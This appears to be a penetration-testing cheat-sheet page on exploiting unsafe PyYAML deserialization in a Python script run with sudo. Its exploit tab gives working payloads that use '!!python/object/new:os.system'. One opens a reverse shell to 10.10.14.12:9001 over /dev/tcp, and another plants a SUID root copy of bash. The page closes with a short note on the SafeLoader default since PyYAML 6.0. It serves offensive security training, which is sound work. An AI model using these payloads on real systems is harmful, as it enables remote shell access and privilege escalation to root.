# Python - Yaml Deserialization

## Theory 

Yaml python libraries is also capable to serialize python objects and not just raw data:

## Practice

### PyYaml Code Execution

{% tabs %}
{% tab title="Enumerate" %}
Assume the python script can be executed as root with sudo rights. If it use the `yaml.load()` method and we controll its input, then the script is vulnerable to arbitrary code execution.

```bash
sudo -l
    (root): /usr/bin/python3 /opt/scripts/example.py
```

Check if we have control over the input of a vulnerable function
```python
import yaml

filename = "example.yml"
yaml.load()
```
{% endtab %}

{% tab title="Exploit" %}
If we controll some variables passed to this vulnerables functions, we can inject arbitrary code. here are example of some payloads:
```python
#Reverse shell
import yaml
from yaml import Loader, UnsafeLoader
yaml.load('!!python/object/new:os.system ["bash -c \'bash -i >& /dev/tcp/10.10.14.12/9001 0>&1\'"]',Loader=Loader)

#SUID bit on bash
data = b'!!python/object/new:os.system ["cp `which bash` /tmp/bash;chown root /tmp/bash;chmod u+sx /tmp/bash"]'
yaml.load(data)
yaml.load(data, Loader=Loader)
yaml.load(data, Loader=UnsafeLoader)
yaml.load_all(data)
yaml.load_all(data, Loader=Loader)
yaml.load_all(data, Loader=UnsafeLoader)
yaml.unsafe_load(data)
```

{% hint style="danger" %}
Since PyYaml **version 6.0**, the default loader for load has been switched to **`SafeLoader`** mitigating the risks against Remote Code Execution.
The vulnerable sinks are now **`yaml.unsafe_load`** and **`yaml.load(input, Loader=yaml.UnsafeLoader)`**
{% endhint %}
{% endtab %}
{% endtabs %}


## References

{% embed url="https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Insecure%20Deserialization/Python/" %}

{% embed url="https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization" %}
